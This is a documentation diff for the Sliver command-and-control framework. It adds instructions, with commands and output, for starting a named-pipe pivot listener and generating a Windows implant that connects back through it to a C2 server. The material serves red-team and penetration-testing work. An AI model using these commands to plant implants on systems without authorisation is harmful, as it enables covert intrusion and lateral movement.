@@ -32,3 +32,27 @@ The next step is to generate a payload that will connect to our listener.
 ```
 
 Executing this payload will cause it to connect back through our original implant and then back to our C2 server.
+
+```asciinema
+{"src": "/asciinema/tcppivot.cast", "cols": "132", "rows": "14", "idleTimeLimit": 8}
+```
+
+As mentionned before named pipe pivots use a similar process, first you need to create a listener:
+
+```bash
+[server] sliver (WARM_DRIVEWAY) > pivots named-pipe --bind foobar
+
+[*] Started named pipe pivot listener \\.\pipe\foobar with id 1
+
+```
+
+You can then generate an implant connecting to it 
+
+```bash
+sliver > generate --os windows --debug --skip-symbols --named-pipe ./pipe/foobar
+
+[*] Generating new windows/amd64 implant binary
+[*] Build completed in 1s
+[*] Implant saved to /Users/tester/code/sliver/PROPER_SING.exe
+```
+
